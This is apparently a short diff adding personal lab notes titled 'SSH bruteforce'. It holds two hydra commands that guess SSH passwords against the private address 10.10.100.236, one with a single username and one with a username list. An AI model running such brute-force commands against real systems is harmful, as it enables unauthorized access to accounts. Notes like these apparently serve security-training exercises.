@@ -1,0 +1,3 @@
+SSH bruteforce
+hydra -l <username> -P <password_file> 10.10.100.236 ssh 
+hydra -L <username_file> -P <password_file> 10.10.100.236 ssh 
